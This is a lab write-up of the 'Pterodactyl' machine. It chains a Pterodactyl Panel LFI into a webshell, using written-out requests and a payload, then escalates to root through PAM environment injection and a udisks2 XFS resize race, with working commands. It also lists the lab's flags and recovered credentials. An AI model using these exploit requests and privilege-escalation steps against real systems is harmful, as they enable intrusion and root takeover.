# Pterodactyl — 10.129.18.36

## Summary

| Item | Value |
|------|-------|
| Target | 10.129.18.36 (pterodactyl.htb) |
| OS | openSUSE Leap 15.6 (kernel 6.4.0) |
| User flag | `793c17584147b8c0c46db1f6bb2e8619` |
| Root flag | `b37cfd3270364eef476ed089f0d38b7a` |
| Initial access | CVE-2025-49132 — Pterodactyl Panel unauthenticated LFI→RCE |
| Privesc | CVE-2025-6018 + CVE-2025-6019 — PAM env injection + udisks2 XFS resize race |

## Attack Chain

### Phase 1: Recon & Enumeration

**Port scan**: SSH (22, OpenSSH 9.6), HTTP (80, nginx 1.21.5).

HTTP redirected to `pterodactyl.htb`. Vhost enumeration found `panel.pterodactyl.htb` (Pterodactyl Panel v1.11.10).

`/changelog.txt` on the main site disclosed:
- Pterodactyl Panel v1.11.10 installed
- MariaDB 11.8.3 backend
- PHP-PEAR enabled
- `register_argc_argv` enabled (confirmed via `/phpinfo.php`)
- No `disable_functions`, no `open_basedir`

### Phase 2: Initial Access — CVE-2025-49132

**Vulnerability**: The Pterodactyl Panel `/locales/locale.json` endpoint passes user-controlled `locale` and `namespace` parameters directly to PHP's `include()` without sanitization or authentication.

**Exploitation**: Two-stage attack combining the LFI with PHP PEAR's `pearcmd.php`:

1. **Write webshell**: LFI includes `pearcmd.php` (via path traversal in `locale`). `register_argc_argv=On` causes the query string to be parsed as CLI arguments. The `config-create` PEAR command writes a PHP file containing `<?=system(hex2bin($_GET[0]));die();?>` to `/tmp/cmd.php`.

```
GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system(hex2bin($_GET[0]));die();?>+/tmp/cmd.php
```

2. **Execute commands**: Include the webshell via the same LFI, passing hex-encoded commands:

```
GET /locales/locale.json?locale=../../../../../../tmp&namespace=cmd&0=6964
```

Result: RCE as `wwwrun` (uid 474).

### Phase 3: Lateral Movement → User Flag

**Database access**: Read `/var/www/pterodactyl/.env` → MariaDB credentials `pterodactyl:PteraPanel`. Used PHP PDO one-liners via the webshell to query the database.

**Panel users discovered**:
| User | Role | Hash |
|------|------|------|
| headmonitor | admin (root_admin=1) | `$2y$10$3WJht3/5GOQm...` (not cracked) |
| phileasfogg3 | normal | `$2y$10$PwO0TBZA8hLB...` |

**Password cracking**: john + rockyou.txt cracked phileasfogg3's bcrypt hash → `!QAZ2wsx` (keyboard walk pattern).

**SSH access**: `phileasfogg3:!QAZ2wsx` → SSH login successful. User flag at `/home/phileasfogg3/user.txt`.

**Other credentials recovered**:
- Wings daemon token: `fyqnJBhstNPUR8lN.nrV4yF4x7e0KkVaab4ptA1XZJwlExVJzUJnWqOeczWfTZnOb5avVzE9CynifW4ax` (from `/etc/pterodactyl/config.yml`)
- Laravel APP_KEY: `base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=`
- HASHIDS_SALT: `pKkOnx0IzJvaUXKWt2PK`

### Phase 4: Privilege Escalation — CVE-2025-6018 + CVE-2025-6019

**sudo configuration**: `(ALL) ALL` with `targetpw` — can run any command as any user, but requires the TARGET user's password (root's password for root). Root password unknown.

**Hint**: Email from headmonitor to phileasfogg3 warned about "unusual udisksd activity" → investigated udisks2 privilege escalation.

**System**: udisks2-2.9.2, polkit-121, openSUSE Leap 15.6.

#### CVE-2025-6018: PAM Environment Variable Injection

**Vulnerability**: On openSUSE, `pam_env.so` runs in the `auth` PAM stack before `pam_systemd.so` runs in the `session` stack. An attacker can create `~/.pam_environment` with:

```
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
```

This tricks `pam_systemd` into registering the session with `seat0`, granting polkit `allow_active` status.

**Complication**: SUSE's `polkit-default-privs` package installs `/etc/polkit-1/rules.d/90-default-privs.rules` which checks `subject.local` (derived from the session's `Remote` property), not just seat assignment. SSH sessions have `Remote=true` regardless of seat, so SSH-based sessions are always denied `allow_active` by this rule.

**Bypass**: Used `su -l phileasfogg3` from the wwwrun RCE (a local process in `php-fpm.service`). Since `su` doesn't set `PAM_RHOST`, the resulting session has `Remote=false`. Combined with `XDG_SEAT=seat0` from `.pam_environment`, this gives a session where `subject.local=true` AND `subject.active=true` → polkit grants `allow_active`.

**Critical constraint**: pam_systemd only creates a NEW logind session when no existing session for the user is active. Zombie sessions from previous `su` calls block new session creation. Must kill all user processes first.

#### CVE-2025-6019: udisks2 XFS Resize Race Condition

**Vulnerability**: When `Filesystem.Resize` is called on an unmounted XFS block device, libblockdev (`bd_fs_xfs_resize`) creates a temporary mount at `/tmp/blockdev.XXXXXX` **without nosuid/nodev flags**, runs `xfs_growfs`, then unmounts. A SUID binary in the XFS image can be executed during the race window.

**Exploitation**:

1. **Create XFS image** (300MB via `mkfs.xfs`, extended to 500MB via `truncate` for growable space):
```bash
dd if=/dev/zero of=/dev/shm/xfs.img bs=1M count=300
mkfs.xfs -f /dev/shm/xfs.img
truncate -s 500M /dev/shm/xfs.img
```

2. **Plant SUID bash**: Mount via udisksd (`udisksctl loop-setup` + `mount`), copy `/usr/bin/bash`, unmount.

3. **Fix ownership via xfs_db** (set uid=0, gid=0, mode=0104755 on the xpl inode):
```bash
xfs_db -x -c 'inode 131' -c 'write core.uid 0' -c 'write core.gid 0' -c 'write core.mode 0104755' /dev/shm/xfs.img
```

4. **Trigger resize race**: Set up loop device, start race watcher for `/tmp/blockdev.*/xpl`, then call `Filesystem.Resize` via D-Bus:
```bash
gdbus call --system --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
```

5. **Result**: The resize mounted the XFS at `/tmp/blockdev.8BEPN3` without nosuid. The unmount failed ("target is busy" from the race watcher). SUID root bash persisted:

```
-rwsr-xr-x 1 root root 1012656 Apr  5 03:59 /tmp/blockdev.8BEPN3/xpl
```

```
$ /tmp/blockdev.8BEPN3/xpl -p -c id
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
```

## Key Obstacles & Lessons

1. **polkit-default-privs**: SUSE-specific JS rule overrides polkit's implicit `allow_active=yes` by checking `subject.local`. This is NOT present on upstream polkit. Reading `/sbin/chkstat-polkit` (the Perl generator) revealed the JS template.

2. **Session management**: `su` from a systemd service context doesn't always create a new logind session. Zombie sessions from previous `su` calls block creation. The session counter (`c76`, `c86`, etc.) increments but creation fails silently if the user slice already has abandoned scopes.

3. **XFS resize needs room to grow**: If the XFS filesystem fills the entire loop device, `xfs_growfs` is a no-op and no temp mount is created. The image must be larger than the formatted filesystem.

4. **Disk space**: The 6GB root partition was nearly full. Using `/dev/shm` (tmpfs, 987MB) for the XFS image avoided disk space issues.

## Remediation

1. **Pterodactyl Panel**: Upgrade to v1.11.11+ (patches CVE-2025-49132 LFI)
2. **PHP**: Disable `register_argc_argv`, set `disable_functions` for dangerous functions, configure `open_basedir`
3. **phpinfo()**: Remove from production
4. **udisks2**: Update to patched version that mounts with nosuid during resize
5. **PAM**: Remove or restrict `pam_env.so` user file reading (`user_readenv=0`)
6. **polkit**: Review and harden default privilege rules
7. **Credentials**: Rotate all recovered credentials (DB password, APP_KEY, Wings token, user passwords)
